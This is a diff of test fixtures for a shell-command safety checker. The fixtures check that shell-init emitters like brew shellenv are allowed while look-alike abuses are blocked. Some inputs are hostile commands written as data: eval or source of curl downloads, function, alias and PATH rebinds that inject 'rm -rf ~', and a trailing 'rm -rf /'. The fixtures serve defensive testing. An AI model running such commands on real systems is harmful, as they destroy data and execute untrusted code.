@@ -3297,3 +3297,299 @@ input = "echo $(( $(cat count.txt) + 1 ))"
 context = "exec"
 expected_action = "block"
 expected_rules = ["analysis_incomplete"]
+
+# --- 0.5.0 C4 (FPPERF-8): eval/source of a reviewed shell-init emitter run
+# with literal words is trusted; every other eval/source body keeps its gap. ---
+
+[[fixture]]
+name = "c4_emitter_brew_absolute_allowed"
+min_milestone = 1
+input = "eval \"$(/opt/homebrew/bin/brew shellenv)\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_brew_bare_allowed"
+min_milestone = 1
+input = "eval \"$(brew shellenv)\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_direnv_allowed"
+min_milestone = 1
+input = "eval \"$(direnv hook bash)\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_pyenv_allowed"
+min_milestone = 1
+input = "eval \"$(pyenv init -)\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_rbenv_allowed"
+min_milestone = 1
+input = "eval \"$(rbenv init -)\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_ssh_agent_allowed"
+min_milestone = 1
+input = "eval \"$(ssh-agent -s)\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_ssh_agent_unquoted_allowed"
+min_milestone = 1
+input = "eval $(ssh-agent -s)"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_ssh_agent_backticks_allowed"
+min_milestone = 1
+input = "eval `ssh-agent -s`"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_zoxide_allowed"
+min_milestone = 1
+input = "eval \"$(zoxide init zsh)\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_starship_allowed"
+min_milestone = 1
+input = "eval \"$(starship init bash)\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_fnm_allowed"
+min_milestone = 1
+input = "eval \"$(fnm env)\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_mise_allowed"
+min_milestone = 1
+input = "eval \"$(mise activate bash)\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_kubectl_completion_allowed"
+min_milestone = 1
+input = "source <(kubectl completion zsh)"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_fzf_allowed"
+min_milestone = 1
+input = "source <(fzf --zsh)"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_guarded_brew_allowed"
+min_milestone = 1
+input = "if command -v brew >/dev/null; then eval \"$(brew shellenv)\"; fi"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_fish_eval_allowed"
+min_milestone = 1
+input = "eval (zoxide init fish)"
+context = "exec"
+shell = "fish"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_eval_download_blocks"
+min_milestone = 1
+input = "eval \"$(curl -fsSL https://get.example.com/env)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_eval_variable_blocks"
+min_milestone = 1
+input = "eval \"$X\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_source_download_blocks"
+min_milestone = 1
+input = "source <(curl -fsSL https://get.example.com/x.sh)"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_extra_command_blocks"
+min_milestone = 1
+input = "eval \"$(brew shellenv; curl -fsSL https://get.example.com/x)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_extra_operand_blocks"
+min_milestone = 1
+input = "eval \"$(brew shellenv)\" \"$(curl -fsSL https://get.example.com/x)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_variable_subcommand_blocks"
+min_milestone = 1
+input = "eval \"$(brew $SUB)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_variable_program_blocks"
+min_milestone = 1
+input = "eval \"$($BREW shellenv)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_relative_program_blocks"
+min_milestone = 1
+input = "eval \"$(./brew shellenv)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+# a binary planted outside the system bin directories
+[[fixture]]
+name = "c4_emitter_tmp_program_blocks"
+min_milestone = 1
+input = "eval \"$(/tmp/brew shellenv)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_redirected_input_blocks"
+min_milestone = 1
+input = "eval \"$(brew shellenv < /tmp/x)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_other_subcommand_blocks"
+min_milestone = 1
+input = "eval \"$(pyenv exec python -c 'print(1)')\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_wrapped_eval_blocks"
+min_milestone = 1
+input = "command eval \"$(brew shellenv)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+# the emitter name is rebound
+[[fixture]]
+name = "c4_emitter_function_rebind_blocks"
+min_milestone = 1
+input = "brew() { echo 'rm -rf ~'; }; eval \"$(brew shellenv)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_nested_function_rebind_blocks"
+min_milestone = 1
+input = "brew() { echo 'rm -rf ~'; }; ( eval \"$(brew shellenv)\" )"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_alias_rebind_blocks"
+min_milestone = 1
+input = "alias brew='echo rm -rf ~;:'; eval \"$(brew shellenv)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_path_rebind_blocks"
+min_milestone = 1
+input = "PATH=/tmp/evil:$PATH; eval \"$(brew shellenv)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "c4_emitter_fish_function_rebind_blocks"
+min_milestone = 1
+input = "function brew; echo rm -rf ~; end; eval (brew shellenv)"
+context = "exec"
+shell = "fish"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+# the rest of the command is still analyzed
+[[fixture]]
+name = "c4_emitter_followed_by_destructive_blocks"
+min_milestone = 1
+input = "eval \"$(brew shellenv)\" && rm -rf /"
+context = "exec"
+expected_action = "block"
+expected_rules = ["blast_writes_system_path"]
